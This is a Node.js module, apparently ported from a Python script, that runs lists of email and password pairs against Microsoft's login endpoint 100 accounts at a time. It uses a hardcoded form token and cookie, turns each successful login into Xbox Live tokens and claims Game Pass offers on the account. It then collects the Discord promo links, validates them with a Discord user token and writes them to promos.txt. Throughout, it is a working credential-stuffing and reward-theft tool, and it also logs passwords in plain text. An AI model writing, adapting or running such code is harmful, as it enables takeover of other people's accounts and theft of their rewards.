// ============================================================
//  Promo Puller — 1:1 Node.js port of main.py
//  Isolated module. Does NOT use the global proxy pool.
//  Direct connections only (the source script has no proxies).
//  Do not modify internal logic.
// ============================================================

const fs = require("fs");
const path = require("path");
const config = require("../config");
const { logger } = require("./logger");

const log = logger.child("promopuller");

// ── Hardcoded values ported verbatim from main.py ────────────
const TOKEN_URL =
  "https://login.live.com/ppsecure/post.srf?client_id=00000000402B5328&contextid=BDC5114DCDD66170&opid=24F67D97F397B4D4&bk=1766143321&uaid=b63537c0c7504c9994c9bb225f8b15b1&pid=15216&prompt=none";

const PPFT =
  "-DtA1pAkl0XJHNRkli!yvhp27QUgO13pUa3ZWnDBoHwyy!k9wWNwRWEyQYe!VK9zJcqrm8WWg7JoT30qyiKuxfftM*Nu6dE*e2km5kZLsSJhMmVmWWPE1KERSnnEcSLmF7fINHZ8RCZiQuA7svzQrpZ!cT0EXEdgCMzKKtGxHdEr2ASIuVp18K!PVtqs!!VJ2BHaCCoZmkDbbdM93QVJFUEqlZs5Irk1FrfHBmkOwc!oljXDF7s4yd0QLH6F8!OApew$$";

const STATIC_COOKIE =
  "MSPRequ=id=N&lt=1766143321&co=0; uaid=b63537c0c7504c9994c9bb225f8b15b1; OParams=11O.Dmr1Vzmgxhnw*DZMBommGzglE!XAx**dZAAEAkqrj6Vhfs1*d8zayvuFT4v8h**f4Zznq9nRUcLS9f73g52XDgo7Kbzaj6iKcOC5jd*0H*P0vHhUeQjflLTYuHZ5HjCH91cYf2IwyylYf1h*C0T0EAXHejOrafOi5c0OR9bDhZmwlD0LAij0Nh!LTG99GmPovt95zHocHGurn3MldqO7Wiu5sxHh72H0Lyq7fpM6jzizp7AunI36mEHFzldPpwHIiRIKpTu*ZLNOMdGWqc0eSTB8YMzPtg8dceV4x5n9Tg2EUB2Ys3Dy2Y0BTAddNnvHH4XHvg!FnkKhATiMub2jf8aakcAvExkfKMMWQuvAsS8shz0nD*eOvpilbh273y!r43VDwk5BEaKKmnZwjWFnKpWfx2wi1x3vfEtiU!EVKaGG; MSPOK=$uuid-643bb80a-c886-4f04-af49-4ab7b44ddc78$uuid-ee3b24c9-f289-4f10-aff1-7ff79eb97c11";

const DISCORD_TOKEN = config.DISCORD_TOKEN || "YOUR_DISCORD_TOKEN_HERE";

const MAX_THREADS = 100;
const STEP_RETRIES_LIMIT = 5;
const OUTER_RETRIES_LIMIT = 5;
const REQ_TIMEOUT_MS = 10000;

const PROMOS_FILE = path.join(__dirname, "..", "..", "promos.txt");
const SAVE_LOCK = { busy: false, queue: [] };

// Mutex for promos.txt + counters (mirrors save_lock in python)
async function withSaveLock(fn) {
  if (SAVE_LOCK.busy) {
    await new Promise((res) => SAVE_LOCK.queue.push(res));
  }
  SAVE_LOCK.busy = true;
  try {
    return await fn();
  } finally {
    SAVE_LOCK.busy = false;
    const next = SAVE_LOCK.queue.shift();
    if (next) next();
  }
}

// ── Timeout fetch ────────────────────────────────────────────
async function timedFetch(url, opts = {}, ms = REQ_TIMEOUT_MS) {
  const ctrl = new AbortController();
  const userSignal = opts.signal;
  if (userSignal) {
    if (userSignal.aborted) ctrl.abort();
    else userSignal.addEventListener("abort", () => ctrl.abort(), { once: true });
  }
  const timer = setTimeout(() => {
    try { ctrl.abort(); } catch {}
  }, ms);
  try {
    return await fetch(url, { ...opts, redirect: "manual", signal: ctrl.signal });
  } finally {
    clearTimeout(timer);
  }
}

// ── Promo validation via Discord API (check_promo) ───────────
async function checkPromo(promoLink) {
  try {
    if (!DISCORD_TOKEN || DISCORD_TOKEN === "YOUR_DISCORD_TOKEN_HERE") {
      return { data: null, error: "No Token Provided" };
    }
    const code = promoLink.split("/").pop();
    const r = await timedFetch(
      `https://discord.com/api/v9/entitlements/gift-codes/${code}?with_application=false&with_subscription_plan=true`,
      { method: "GET", headers: { Authorization: DISCORD_TOKEN } },
    );
    if (r.status === 200) {
      const data = await r.json();
      if (data.uses >= data.max_uses) return { data: null, error: "Max Uses Reached" };
      if (data.redeemed) return { data: null, error: "Already Redeemed" };
      return {
        data: { uses: data.uses, max_uses: data.max_uses, expires_at: data.expires_at },
        error: null,
      };
    } else if (r.status === 404) {
      return { data: null, error: "Invalid Code (404)" };
    } else {
      return { data: null, error: `Check Failed (${r.status})` };
    }
  } catch (e) {
    return { data: null, error: `Error: ${e.message || e}` };
  }
}

// ── Per-account check (1:1 port of `check`) ──────────────────
async function checkAccount(email, password, signal, counters) {
  let outerRetries = 0;

  while (true) {
    if (signal?.aborted) return { error: "aborted", links: [] };
    if (outerRetries > OUTER_RETRIES_LIMIT) return { error: "retries_exhausted", links: [] };
    outerRetries += 1;

    try {
      // ── Step 1: token request ─────────────────────────────
      let token = null;
      let stepRetries = 0;
      while (true) {
        if (signal?.aborted) return { error: "aborted", links: [] };
        if (stepRetries > STEP_RETRIES_LIMIT) return { error: "token_retries", links: [] };
        stepRetries += 1;
        try {
          const body = new URLSearchParams({
            login: email,
            loginfmt: email,
            passwd: password,
            PPFT: PPFT,
          }).toString();
          const tokenReq = await timedFetch(TOKEN_URL, {
            method: "POST",
            headers: {
              "content-type": "application/x-www-form-urlencoded",
              cookie: STATIC_COOKIE,
            },
            body,
            signal,
          });
          if (tokenReq.status === 429) continue;
          if (tokenReq.status !== 302) return { error: `token_status_${tokenReq.status}`, links: [] };
          const loc = tokenReq.headers.get("location") || "";
          if (loc.includes("token=")) {
            token = loc.split("token=")[1].split("&")[0];
          } else {
            return { error: "no_token_in_location", links: [] };
          }
          break;
        } catch (_) {
          continue;
        }
      }

      if (!token || token === "None") break;

      // ── Step 2: Xbox user authenticate ────────────────────
      let xboxToken = null, uhs = null;
      stepRetries = 0;
      while (true) {
        if (signal?.aborted) return { error: "aborted", links: [] };
        if (stepRetries > STEP_RETRIES_LIMIT) return { error: "xbox_retries", links: [] };
        stepRetries += 1;
        try {
          const xbl = await timedFetch("https://user.auth.xboxlive.com/user/authenticate", {
            method: "POST",
            headers: { "content-type": "application/json", accept: "application/json" },
            body: JSON.stringify({
              Properties: {
                AuthMethod: "RPS",
                SiteName: "user.auth.xboxlive.com",
                RpsTicket: token,
              },
              RelyingParty: "http://auth.xboxlive.com",
              TokenType: "JWT",
            }),
            signal,
          });
          if (xbl.status === 429) continue;
          const js = await xbl.json().catch(() => ({}));
          xboxToken = js.Token;
          if (xboxToken) {
            uhs = js?.DisplayClaims?.xui?.[0]?.uhs;
            break;
          } else {
            return { error: "no_xbox_token", links: [] };
          }
        } catch (_) {
          continue;
        }
      }

      // ── Step 3: XSTS authorize ────────────────────────────
      let authToken = null;
      stepRetries = 0;
      while (true) {
        if (signal?.aborted) return { error: "aborted", links: [] };
        if (stepRetries > STEP_RETRIES_LIMIT) return { error: "xsts_retries", links: [] };
        stepRetries += 1;
        try {
          const xsts = await timedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
            method: "POST",
            headers: { "content-type": "application/json", accept: "application/json" },
            body: JSON.stringify({
              Properties: { SandboxId: "RETAIL", UserTokens: [xboxToken] },
              RelyingParty: "http://xboxlive.com",
              TokenType: "JWT",
            }),
            signal,
          });
          if (xsts.status === 429) continue;
          if (xsts.status === 401) return { error: "xsts_401", links: [] };
          const js = await xsts.json().catch(() => ({}));
          const xstsToken = js.Token;
          authToken = `XBL3.0 x=${uhs};${xstsToken}`;
          break;
        } catch (_) {
          continue;
        }
      }

      // ── Step 4: profile.gamepass.com offers ───────────────
      stepRetries = 0;
      const links = [];
      while (true) {
        if (signal?.aborted) return { error: "aborted", links };
        if (stepRetries > STEP_RETRIES_LIMIT) return { error: "offers_retries", links };
        stepRetries += 1;
        try {
          const r = await timedFetch("https://profile.gamepass.com/v2/offers", {
            method: "GET",
            headers: { authorization: authToken },
            signal,
          });
          if (r.status === 200) {
            const j = await r.json().catch(() => ({}));
            const offers = j.offers || [];
            let promoFoundForAccount = false;

            for (const offer of offers) {
              if (signal?.aborted) break;
              let promo = null;

              if (offer.offerStatus === "available") {
                try {
                  const pr = await timedFetch(
                    `https://profile.gamepass.com/v2/offers/${offer.offerId}`,
                    {
                      method: "POST",
                      headers: { authorization: authToken },
                      signal,
                    },
                  );
                  if (pr.status === 200) {
                    const pj = await pr.json().catch(() => ({}));
                    promo = pj.resource;
                  }
                } catch {}
              } else if (offer.offerStatus === "claimed") {
                promo = offer.resource;
              }

              if (promo && String(promo).toLowerCase().includes("discord")) {
                await withSaveLock(async () => {
                  counters.promosFound += 1;
                  const { data: promoData, error: errMsg } = await checkPromo(promo);
                  if (promoData) {
                    const formatted = `${promo} | uses: ${promoData.uses} | max uses: ${promoData.max_uses} | expires at: ${promoData.expires_at}`;
                    log.info(`Found working promo: ${formatted}`);
                    try {
                      fs.appendFileSync(PROMOS_FILE, `${formatted}\n`);
                    } catch (e) {
                      log.warn(`promos.txt write failed: ${e.message}`);
                    }
                    links.push({ link: promo, status: "valid", info: promoData, formatted });
                  } else {
                    log.info(`Found promo (${errMsg}): ${promo}`);
                    links.push({ link: promo, status: "invalid", error: errMsg });
                  }
                });
                promoFoundForAccount = true;
                break;
              }
            }

            if (!promoFoundForAccount) return { error: null, links };
          } else if (r.status === 401 || r.status === 403) {
            return { error: `offers_${r.status}`, links };
          } else {
            continue;
          }
          break;
        } catch (_) {
          continue;
        }
      }

      return { error: null, links };
    } catch (e) {
      const msg = String(e?.message || e || "");
      if (!/timeout|abort/i.test(msg)) {
        log.warn(`Error: ${msg} ${email}:${password}`);
      }
      continue;
    }
  }
  return { error: null, links: [] };
}

// ── Pool runner (mirrors ThreadPoolExecutor max_workers=100) ─
async function runPool(items, worker, concurrency, signal) {
  let i = 0;
  const results = new Array(items.length);
  const workers = [];
  const n = Math.min(concurrency, items.length);
  for (let w = 0; w < n; w++) {
    workers.push((async () => {
      while (true) {
        if (signal?.aborted) return;
        const idx = i++;
        if (idx >= items.length) return;
        try {
          results[idx] = await worker(items[idx], idx);
        } catch (e) {
          results[idx] = { error: e.message || String(e), links: [] };
        }
      }
    })());
  }
  await Promise.all(workers);
  return results;
}

// ── Public API: same signature shape as microsoft-puller.pullLinks ─
async function pullPromos(accounts, onProgress, signal) {
  // Reset promos.txt at the start of each run (matches python "a" append behavior
  // semantically but gives a clean per-run output for the user).
  try { fs.writeFileSync(PROMOS_FILE, ""); } catch {}

  const counters = { checked: 0, promosFound: 0 };
  const total = accounts.length;
  const fetchResults = [];
  const allLinks = [];

  log.info(`starting promo puller with ${total} accounts (no proxies, direct)`);

  await runPool(
    accounts,
    async (acc) => {
      const email = acc.email || acc[0];
      const password = acc.password || acc[1];
      const res = await checkAccount(email, password, signal, counters);

      counters.checked += 1;

      const accountLinks = (res.links || []).map((l) =>
        typeof l === "string" ? l : l.link,
      );

      fetchResults.push({
        email,
        password,
        links: accountLinks,
        error: res.error || null,
        details: res.links || [],
      });

      for (const l of res.links || []) {
        const link = typeof l === "string" ? l : l.link;
        allLinks.push({ link, sourceEmail: email });
      }

      if (typeof onProgress === "function") {
        try {
          onProgress("fetch", {
            done: counters.checked,
            total,
            email,
            links: accountLinks.length,
            error: res.error || null,
          });
        } catch {}
      }
    },
    MAX_THREADS,
    signal,
  );

  log.info(`finished. checked=${counters.checked}/${total} promos_found=${counters.promosFound}`);

  return { fetchResults, allLinks };
}

module.exports = { pullPromos };
